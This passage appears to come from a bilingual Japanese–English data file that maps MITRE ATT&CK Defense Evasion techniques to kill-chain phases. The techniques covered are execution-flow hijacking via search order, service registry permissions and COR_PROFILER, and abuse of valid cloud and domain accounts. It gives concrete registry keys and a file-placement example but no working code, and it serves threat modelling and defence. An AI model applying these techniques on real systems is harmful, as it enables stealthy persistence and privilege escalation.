防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1574,実行フローのハイジャック,Hijack Execution Flow,"攻撃者は、オペレーティングシステムがプログラムを実行する方法をハイジャックすることで、独自の悪意のあるペイロードを実行する可能性があります。実行フローのハイジャックは、ハイジャックされた実行が時間とともに再発する可能性があるため、永続化を目的とすることができます。攻撃者はまた、アプリケーション制御やその他の実行制限など、権限を昇格させたり防御を回避したりするためにこれらのメカニズムを使用する可能性があります。

攻撃者が実行フローをハイジャックする方法は多数あり、オペレーティングシステムが実行するプログラムを特定する方法を操作することなどが含まれます。プログラムが使用するライブラリをオペレーティングシステムが特定する方法も傍受される可能性があります。ファイルディレクトリや、Windowsの場合はレジストリなど、オペレーティングシステムがプログラム/リソースを探す場所も、悪意のあるペイロードを含むように汚染される可能性があります。","Adversaries may execute their own malicious payloads by hijacking the way operating systems run programs. Hijacking execution flow can be for the purposes of persistence, since this hijacked execution may reoccur over time. Adversaries may also use these mechanisms to elevate privileges or evade defenses, such as application control or other restrictions on execution.

There are many ways an adversary may hijack the flow of execution, including by manipulating how the operating system locates programs to be executed. How the operating system locates libraries to be used by a program can also be intercepted. Locations where the operating system looks for programs/resources, such as file directories and in the case of Windows the Registry, could also be poisoned to include malicious payloads.",T1574.008,検索順ハイジャックによるパスインターセプション,Path Interception by Search Order Hijacking,"攻撃者は、他のプログラムのロードに使用される検索順序をハイジャックすることで、独自の悪意のあるペイロードを実行する可能性があります。プログラムによってはフルパスで他のプログラムを呼び出さないものもあるため、敵は呼び出し元のプログラムがあるディレクトリに自分のファイルを置き、呼び出し元のプログラムの要求に応じてオペレーティングシステムが悪意のあるソフトウェアを起動するように仕向ける可能性があります。

検索順序のハイジャックは、敵対者がWindowsがパスを与えられていないプログラムを検索する順序を悪用することで発生する。[DLL](https://attack.mitre.org/techniques/T1574/001)の検索順ハイジャックとは異なり、検索順はプログラムの実行に使用されるメソッドによって異なります。(引用: Microsoft CreateProcess) (引用: Windows NT Command Shell) (引用: Microsoft WinExec) しかし、WindowsはWindowsシステムディレクトリを検索する前に、開始プログラムのディレクトリを検索するのが一般的である。検索順序のハイジャックに対して脆弱なプログラム（すなわち、実行可能ファイルへのパスを指定しないプログラム）を見つけた敵対者は、不適切に指定されたプログラムにちなんだ名前のプログラムを作成し、それを開始プログラムのディレクトリ内に配置することによって、この脆弱性を利用することができる。

例えば、「example.exe」はコマンドライン引数<code>net user</code>で「cmd.exe」を実行します。攻撃者がexample.exeと同じディレクトリに「net.exe」というプログラムを置くと、「net.exe」はWindowsのシステムユーティリティnetの代わりに実行されます。さらに、攻撃者が「net.com」というプログラムを「net.exe」と同じディレクトリに置いた場合、PATHEXTで定義された実行可能拡張子の順序により、<code>cmd.exe /C net user</code>は「net.exe」の代わりに「net.com」を実行します。(引用: Microsoft Environment Property)

検索順のハイジャックもDLLのロードをハイジャックするための一般的な方法で、[DLL](https://attack.mitre.org/techniques/T1574/001)でカバーされています。","Adversaries may execute their own malicious payloads by hijacking the search order used to load other programs. Because some programs do not call other programs using the full path, adversaries may place their own file in the directory where the calling program is located, causing the operating system to launch their malicious software at the request of the calling program.

Search order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path. Unlike [DLL](https://attack.mitre.org/techniques/T1574/001) search order hijacking, the search order differs depending on the method that is used to execute the program. (Citation: Microsoft CreateProcess) (Citation: Windows NT Command Shell) (Citation: Microsoft WinExec) However, it is common for Windows to search in the directory of the initiating program before searching through the Windows system directory. An adversary who finds a program vulnerable to search order hijacking (i.e., a program that does not specify the path to an executable) may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program's directory.

For example, \""example.exe\"" runs \""cmd.exe\"" with the command-line argument <code>net user</code>. An adversary may place a program called \""net.exe\"" within the same directory as example.exe, \""net.exe\"" will be run instead of the Windows system utility net. In addition, if an adversary places a program called \""net.com\"" in the same directory as \""net.exe\"", then <code>cmd.exe /C net user</code> will execute \""net.com\"" instead of \""net.exe\"" due to the order of executable extensions defined under PATHEXT. (Citation: Microsoft Environment Property)

Search order hijacking is also a common practice for hijacking DLL loads and is covered in [DLL](https://attack.mitre.org/techniques/T1574/001).",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1574,実行フローのハイジャック,Hijack Execution Flow,"攻撃者は、オペレーティングシステムがプログラムを実行する方法をハイジャックすることで、独自の悪意のあるペイロードを実行する可能性があります。実行フローのハイジャックは、ハイジャックされた実行が時間とともに再発する可能性があるため、永続化を目的とすることができます。攻撃者はまた、アプリケーション制御やその他の実行制限など、権限を昇格させたり防御を回避したりするためにこれらのメカニズムを使用する可能性があります。

攻撃者が実行フローをハイジャックする方法は多数あり、オペレーティングシステムが実行するプログラムを特定する方法を操作することなどが含まれます。プログラムが使用するライブラリをオペレーティングシステムが特定する方法も傍受される可能性があります。ファイルディレクトリや、Windowsの場合はレジストリなど、オペレーティングシステムがプログラム/リソースを探す場所も、悪意のあるペイロードを含むように汚染される可能性があります。","Adversaries may execute their own malicious payloads by hijacking the way operating systems run programs. Hijacking execution flow can be for the purposes of persistence, since this hijacked execution may reoccur over time. Adversaries may also use these mechanisms to elevate privileges or evade defenses, such as application control or other restrictions on execution.

There are many ways an adversary may hijack the flow of execution, including by manipulating how the operating system locates programs to be executed. How the operating system locates libraries to be used by a program can also be intercepted. Locations where the operating system looks for programs/resources, such as file directories and in the case of Windows the Registry, could also be poisoned to include malicious payloads.",T1574.011,サービスレジストリアクセス許可の脆弱性,Services Registry Permissions Weakness,"攻撃者は、サービスが使用するレジストリ・エントリをハイジャックすることで、独自の悪意のあるペイロードを実行する可能性がある。攻撃者は、サービスに関連するレジストリ キーのパーミッションの欠陥を利用して、サービスの起動時に独自のコードを起動するために、本来指定されている実行可能ファイルから自分たちが制御する実行可能ファイルへとリダイレクトする可能性がある。Windowsは、レジストリの<code>HKLM\\SYSTEM\\CurrentControlSet\\Services</code>の下にローカルサービスのコンフィギュレーション情報を格納します。サービスのレジストリキーの下に格納された情報は、サービスコントローラー、sc.exe、 [PowerShell](https://attack.mitre.org/techniques/T1059/001)、または[Reg](https://attack.mitre.org/software/S0075)のようなツールを使って、サービスの実行パラメーターを変更するために操作することができる。レジストリ・キーへのアクセスは、アクセス制御リストとユーザー権限によって制御される。(引用：レジストリキーのセキュリティ）（引用：malware_hides_service）

ユーザーやグループのパーミッションが適切に設定されておらず、サービスのレジストリ・キーへのアクセスを許可している場合、敵対者はサービスのbinPath/ImagePathを変更し、自分のコントロール下にある別の実行ファイルを指すようにする可能性があります。サービスが開始または再起動されると、敵が制御するプログラムが実行され、サービスが実行されるように設定されたアカウントコンテキスト（ローカル/ドメインアカウント、SYSTEM、LocalService、またはNetworkService）への永続化および/または特権昇格が可能になります。

逆境者はまた、サービスのレジストリツリー内の他のレジストリキーを変更する可能性があります。たとえば、<code>FailureCommand</code>キーが変更され、サービスに障害が発生したり、サービスが意図的に破損したりした場合に、いつでも昇格したコンテキストでサービスが実行されるようにすることができる。 (引用：Kansa サービス関連コレクター）（引用：Tweet Registry Perms Weakness)

<code>Performance</code>キーには、ドライバ サービスのパフォーマンス DLL の名前と、DLL 内のいくつかのエクスポートされた関数の名前が含まれます。(引用: microsoft_services_registry_tree) <code>Performance</code> キーがまだ存在せず、敵に制御されたユーザーが <code>Create Subkey</code> 権限を持っている場合、敵はサービスのレジストリ ツリーに悪意のある DLL を指す <code>Performance</code> キーを作成する可能性があります。(引用: insecure_reg_perms)

また、ドライバ固有のデータを格納する <code>Parameters</code> キーや、その他のカスタム サブキーを悪意のあるサービスに追加して、永続性を確立したり、その他の悪意のある活動を可能にしたりすることもできます。(引用: microsoft_services_registry_tree)(引用: troj_zegost) さらに、敵対者が svchost.exe を使用して悪意のあるサービスを起動する場合、サービスのファイルは <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\servicename\\Parameters\\ServiceDll</code> を使用して識別される可能性があります(引用: malware_hides_service)。","Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services. Adversaries may use flaws in the permissions for Registry keys related to services to redirect from the originally specified executable to one that they control, in order to launch their own code when a service starts. Windows stores local service configuration information in the Registry under <code>HKLM\\SYSTEM\\CurrentControlSet\\Services</code>. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe,  [PowerShell](https://attack.mitre.org/techniques/T1059/001), or [Reg](https://attack.mitre.org/software/S0075). Access to Registry keys is controlled through access control lists and user permissions. (Citation: Registry Key Security)(Citation: malware_hides_service)

If the permissions for users and groups are not properly set and allow access to the Registry keys for a service, adversaries may change the service's binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to establish persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).

Adversaries may also alter other Registry keys in the service’s Registry tree. For example, the <code>FailureCommand</code> key may be changed so that the service is executed in an elevated context anytime the service fails or is intentionally corrupted.(Citation: Kansa Service related collectors)(Citation: Tweet Registry Perms Weakness)

The <code>Performance</code> key contains the name of a driver service's performance DLL and the names of several exported functions in the DLL.(Citation: microsoft_services_registry_tree) If the <code>Performance</code> key is not already present and if an adversary-controlled user has the <code>Create Subkey</code> permission, adversaries may create the <code>Performance</code> key in the service’s Registry tree to point to a malicious DLL.(Citation: insecure_reg_perms)

Adversaries may also add the <code>Parameters</code> key, which stores driver-specific data, or other custom subkeys for their malicious services to establish persistence or enable other malicious activities.(Citation: microsoft_services_registry_tree)(Citation: troj_zegost) Additionally, If adversaries launch their malicious services using svchost.exe, the service’s file may be identified using <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\servicename\\Parameters\\ServiceDll</code>.(Citation: malware_hides_service)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1574,実行フローのハイジャック,Hijack Execution Flow,"攻撃者は、オペレーティングシステムがプログラムを実行する方法をハイジャックすることで、独自の悪意のあるペイロードを実行する可能性があります。実行フローのハイジャックは、ハイジャックされた実行が時間とともに再発する可能性があるため、永続化を目的とすることができます。攻撃者はまた、アプリケーション制御やその他の実行制限など、権限を昇格させたり防御を回避したりするためにこれらのメカニズムを使用する可能性があります。

攻撃者が実行フローをハイジャックする方法は多数あり、オペレーティングシステムが実行するプログラムを特定する方法を操作することなどが含まれます。プログラムが使用するライブラリをオペレーティングシステムが特定する方法も傍受される可能性があります。ファイルディレクトリや、Windowsの場合はレジストリなど、オペレーティングシステムがプログラム/リソースを探す場所も、悪意のあるペイロードを含むように汚染される可能性があります。","Adversaries may execute their own malicious payloads by hijacking the way operating systems run programs. Hijacking execution flow can be for the purposes of persistence, since this hijacked execution may reoccur over time. Adversaries may also use these mechanisms to elevate privileges or evade defenses, such as application control or other restrictions on execution.

There are many ways an adversary may hijack the flow of execution, including by manipulating how the operating system locates programs to be executed. How the operating system locates libraries to be used by a program can also be intercepted. Locations where the operating system looks for programs/resources, such as file directories and in the case of Windows the Registry, could also be poisoned to include malicious payloads.",T1574.012,COR_PROFILER,COR_PROFILER,"攻撃者は COR_PROFILER 環境変数を利用して、.NET CLR をロードするプログラムの実行フローを乗っ取る可能性があります。COR_PROFILERは.NET Frameworkの機能で、開発者は共通言語ランタイム（CLR）をロードする各.NETプロセスにロードされるアンマネージド（または.NETの外部）プロファイリングDLLを指定できます。これらのプロファイラーは、.NET CLRで実行されるマネージドコードを監視、トラブルシューティング、デバッグするために設計されています。(引用: Microsoft Profiling Mar 2017)(Citation: Microsoft COR_PROFILER Feb 2013)

COR_PROFILER 環境変数は、さまざまなスコープ（システム、ユーザー、またはプロセス）で設定でき、その結果、影響力のレベルが異なります。システムおよびユーザー全体の環境変数スコープは、[コンポーネントオブジェクトモデル](https://attack.mitre.org/techniques/T1559/001) (COM) オブジェクトをプロファイラ DLL として登録できるレジストリで指定されます。プロセススコープCOR_PROFILERは、レジストリを変更することなくメモリ内に作成することもできます。.NET Framework 4からは、COR_PROFILER_PATH環境変数にDLLの場所が指定されていれば、プロファイリングDLLを登録する必要はありません（引用：Microsoft COR_PROFILER 2013年2月）。

攻撃者はCOR_PROFILERを悪用して、CLRが呼び出されるたびにすべての.NETプロセスのコンテキストで悪意のあるDLLを実行する永続性を確立する可能性があります。また、COR_PROFILERは、被害者である.NETプロセスがより高い権限レベルで実行されている場合、権限の昇格（例：[ユーザーアカウント制御のバイパス](https://attack.mitre.org/techniques/T1548/002)）や、フックおよび[防御の阻害](https://attack.mitre.org/techniques/T1562).NETプロセスによって提供される。(引用: RedCanary Mockingbird 2020年5月)(引用: Red Canary COR_PROFILER 2020年5月)(引用: Almond COR_PROFILER 2019年4月)(引用: GitHub OmerYa Invisi-Shell)(引用: subTee .NET Profilers 2017年5月)","Adversaries may leverage the COR_PROFILER environment variable to hijack the execution flow of programs that load the .NET CLR. The COR_PROFILER is a .NET Framework feature which allows developers to specify an unmanaged (or external of .NET) profiling DLL to be loaded into each .NET process that loads the Common Language Runtime (CLR). These profilers are designed to monitor, troubleshoot, and debug managed code executed by the .NET CLR.(Citation: Microsoft Profiling Mar 2017)(Citation: Microsoft COR_PROFILER Feb 2013)

The COR_PROFILER environment variable can be set at various scopes (system, user, or process) resulting in different levels of influence. System and user-wide environment variable scopes are specified in the Registry, where a [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) object can be registered as a profiler DLL. A process scope COR_PROFILER can also be created in-memory without modifying the Registry. Starting with .NET Framework 4, the profiling DLL does not need to be registered as long as the location of the DLL is specified in the COR_PROFILER_PATH environment variable.(Citation: Microsoft COR_PROFILER Feb 2013)

Adversaries may abuse COR_PROFILER to establish persistence that executes a malicious DLL in the context of all .NET processes every time the CLR is invoked. The COR_PROFILER can also be used to elevate privileges (ex: [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002)) if the victim .NET process executes at a higher permission level, as well as to hook and [Impair Defenses](https://attack.mitre.org/techniques/T1562) provided by .NET processes.(Citation: RedCanary Mockingbird May 2020)(Citation: Red Canary COR_PROFILER May 2020)(Citation: Almond COR_PROFILER Apr 2019)(Citation: GitHub OmerYa Invisi-Shell)(Citation: subTee .NET Profilers May 2017)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1078,有効なアカウント,Valid Accounts,"攻撃者は、初期アクセス、永続化、権限昇格、または防御回避の手段として、既存のアカウントの資格情報を取得して悪用する可能性があります。侵害された資格情報は、ネットワーク内のシステムのさまざまなリソースに配置されたアクセス制御をバイパスするために使用される場合があり、VPN、Outlook Web Access、ネットワークデバイス、リモートデスクトップなど、リモートシステムや外部からアクセス可能なサービスへの永続的なアクセスに使用されることさえあります。(引用: volexity_0day_sophos_FW) 侵害された資格情報は、攻撃者に特定のシステムに対する権限の昇格や、ネットワークの制限された領域へのアクセスを許可する可能性もあります。攻撃者は、これらの資格情報が提供する正当なアクセスと組み合わせてマルウェアやツールを使用しないことを選択し、その存在を検出することをより困難にする場合があります。

場合によっては、攻撃者は非アクティブなアカウントを悪用することがあります。例えば、組織の一員ではなくなった個人に属するアカウントなどです。これらのアカウントを使用すると、元のアカウントユーザーが自分のアカウントで行われている異常なアクティビティを特定するために存在しないため、攻撃者は検出を回避できる可能性があります。(引用: CISA MFA PrintNightmare)

システムのネットワーク全体にわたるローカル、ドメイン、およびクラウドアカウントの権限の重複は懸念事項です。なぜなら、攻撃者はアカウントやシステムをまたいでピボットし、高レベルのアクセス（つまり、ドメインまたはエンタープライズ管理者）に到達して、エンタープライズ内で設定されたアクセス制御をバイパスできる可能性があるためです。(引用: TechNet Credential Theft)","Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop.(Citation: volexity_0day_sophos_FW) Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.

In some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.(Citation: CISA MFA PrintNightmare)

The overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.(Citation: TechNet Credential Theft)",T1078.004,クラウドアカウント,Cloud Accounts,"クラウド環境の有効なアカウントにより、攻撃者は初期アクセス、永続化、権限昇格、または防御回避を達成するためのアクションを実行できる可能性があります。クラウドアカウントとは、ユーザー、リモートサポート、サービス、またはクラウドサービスプロバイダーやSaaSアプリケーション内のリソースの管理のために組織によって作成および構成されたものです。クラウドアカウントはクラウド内にのみ存在することも、Windows Active Directoryなどの他のIDソースとの同期またはフェデレーションを通じてオンプレミスシステムとクラウド間でハイブリッド結合することもできます。(引用: AWS Identity Federation)(引用: Google Federating GC)(引用: Microsoft Deploying AD Federation)

サービスアカウントまたはユーザーアカウントは、[ブルートフォース](https://attack.mitre.org/techniques/T1110)、[フィッシング](https://attack.mitre.org/techniques/T1566)、またはその他のさまざまな手段を通じて攻撃者の標的となり、環境へのアクセスを取得する可能性があります。フェデレーションまたは同期されたアカウントは、攻撃者がオンプレミスシステムとクラウド環境の両方に影響を与える経路となる可能性があります。たとえば、共有資格情報を利用して[リモートサービス](https://attack.mitre.org/techniques/T1021)にログオンするなどです。フェデレーション、同期、またはクラウド専用であるかどうかにかかわらず、特権の高いクラウドアカウントは、ハイブリッド結合されたデバイスでコマンドを実行するためにSaaSベースの[ソフトウェア展開ツール](https://attack.mitre.org/techniques/T1072)を利用することにより、オンプレミス環境へのピボットを可能にする場合もあります。

攻撃者は、環境内での永続性を維持するために、侵害されたクラウドアカウントに長期間有効な[追加のクラウド資格情報](https://attack.mitre.org/techniques/T1098/001)を作成する可能性があります。このような資格情報は、多要素認証などのセキュリティ制御をバイパスするためにも使用される場合があります。

クラウドアカウントはまた、環境内のさまざまな手段を通じて[一時的な昇格されたクラウドアクセス](https://attack.mitre.org/techniques/T1548/005)またはその他の権限を取得できる場合もあります。ロールの割り当てまたはロールの引き受けポリシーの誤構成により、攻撃者はこれらのメカニズムを使用して、アカウントの意図された範囲外の権限を利用できる可能性があります。このような過剰な特権を持つアカウントは、[クラウドAPI](https://attack.mitre.org/techniques/T1059/009)またはその他の方法を通じて、オンラインストレージアカウントおよびデータベースから機密データを収集するために使用される場合があります。たとえば、Azure環境では、攻撃者は関連するAzureリソースがアクセストークンを要求できるようにするAzure Managed Identitiesを標的にする可能性があります。Azure VMなどの管理対象IDがアタッチされたリソースを侵害することにより、攻撃者は[アプリケーションアクセストークンの窃取](https://attack.mitre.org/techniques/T1528)を行い、クラウド環境全体を横断的に移動できる可能性があります。(引用: SpecterOps Managed Identity 2022)","Valid accounts in cloud environments may allow adversaries to perform actions to achieve Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application. Cloud Accounts can exist solely in the cloud; alternatively, they may be hybrid-joined between on-premises systems and the cloud through syncing or federation with other identity sources such as Windows Active Directory.(Citation: AWS Identity Federation)(Citation: Google Federating GC)(Citation: Microsoft Deploying AD Federation)

Service or user accounts may be targeted by adversaries through [Brute Force](https://attack.mitre.org/techniques/T1110), [Phishing](https://attack.mitre.org/techniques/T1566), or various other means to gain access to the environment. Federated or synced accounts may be a pathway for the adversary to affect both on-premises systems and cloud environments - for example, by leveraging shared credentials to log onto [Remote Services](https://attack.mitre.org/techniques/T1021). High privileged cloud accounts, whether federated, synced, or cloud-only, may also allow pivoting to on-premises environments by leveraging SaaS-based [Software Deployment Tools](https://attack.mitre.org/techniques/T1072) to run commands on hybrid-joined devices.

An adversary may create long lasting [Additional Cloud Credentials](https://attack.mitre.org/techniques/T1098/001) on a compromised cloud account to maintain persistence in the environment. Such credentials may also be used to bypass security controls such as multi-factor authentication.

Cloud accounts may also be able to assume [Temporary Elevated Cloud Access](https://attack.mitre.org/techniques/T1548/005) or other privileges through various means within the environment. Misconfigurations in role assignments or role assumption policies may allow an adversary to use these mechanisms to leverage permissions outside the intended scope of the account. Such over privileged accounts may be used to harvest sensitive data from online storage accounts and databases through [Cloud API](https://attack.mitre.org/techniques/T1059/009) or other methods. For example, in Azure environments, adversaries may target Azure Managed Identities, which allow associated Azure resources to request access tokens. By compromising a resource with an attached Managed Identity, such as an Azure VM, adversaries may be able to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s to move laterally across the cloud environment.(Citation: SpecterOps Managed Identity 2022)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1078,有効なアカウント,Valid Accounts,"攻撃者は、初期アクセス、永続化、権限昇格、または防御回避の手段として、既存のアカウントの資格情報を取得して悪用する可能性があります。侵害された資格情報は、ネットワーク内のシステムのさまざまなリソースに配置されたアクセス制御をバイパスするために使用される場合があり、VPN、Outlook Web Access、ネットワークデバイス、リモートデスクトップなど、リモートシステムや外部からアクセス可能なサービスへの永続的なアクセスに使用されることさえあります。(引用: volexity_0day_sophos_FW) 侵害された資格情報は、攻撃者に特定のシステムに対する権限の昇格や、ネットワークの制限された領域へのアクセスを許可する可能性もあります。攻撃者は、これらの資格情報が提供する正当なアクセスと組み合わせてマルウェアやツールを使用しないことを選択し、その存在を検出することをより困難にする場合があります。

場合によっては、攻撃者は非アクティブなアカウントを悪用することがあります。例えば、組織の一員ではなくなった個人に属するアカウントなどです。これらのアカウントを使用すると、元のアカウントユーザーが自分のアカウントで行われている異常なアクティビティを特定するために存在しないため、攻撃者は検出を回避できる可能性があります。(引用: CISA MFA PrintNightmare)

システムのネットワーク全体にわたるローカル、ドメイン、およびクラウドアカウントの権限の重複は懸念事項です。なぜなら、攻撃者はアカウントやシステムをまたいでピボットし、高レベルのアクセス（つまり、ドメインまたはエンタープライズ管理者）に到達して、エンタープライズ内で設定されたアクセス制御をバイパスできる可能性があるためです。(引用: TechNet Credential Theft)","Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop.(Citation: volexity_0day_sophos_FW) Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.

In some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.(Citation: CISA MFA PrintNightmare)

The overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.(Citation: TechNet Credential Theft)",T1078.002,ドメインアカウント,Domain Accounts,"攻撃者は、初期アクセス、永続化、権限昇格、または防御回避の手段として、ドメインアカウントの資格情報を取得して悪用する可能性があります。(引用: TechNet Credential Theft) ドメインアカウントとは、Active Directoryドメインサービスによって管理され、そのドメインの一部であるシステムおよびサービス全体でアクセスと権限が構成されるものです。ドメインアカウントには、ユーザー、管理者、およびサービスが含まれます。(引用: Microsoft AD Accounts)

